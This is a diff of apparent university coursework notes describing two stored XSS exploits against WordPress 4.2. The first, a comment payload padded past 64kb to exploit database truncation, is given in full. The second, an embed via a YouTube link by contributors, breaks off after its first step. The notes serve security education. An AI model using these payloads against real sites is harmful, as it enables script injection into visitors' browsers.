@@ -2,10 +2,13 @@
 CyberSecurity University Assignments
 
 Exploit 1
+
 Wordpress version: 4.2
+
 Time: 2 hours
 
 Issue
+
 If the text entered into the comment field exceeds 64kb, the input gets truncated in the MySQL database.  This enables XSS capability.
 
 1.  Use commnad with over 64kb worth of chartacters attached:  <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
@@ -18,10 +21,13 @@ If the text entered into the comment field exceeds 64kb, the input gets truncate
 
 
 Exploit 2
+
 WordPress version 4.2
+
 Time: 1 hour
 
 Issue 
+
 Contributers can embed a YouTube link with code in the link to execute an XSS attack.
 
 1.  Grab embeded video link from YouTube
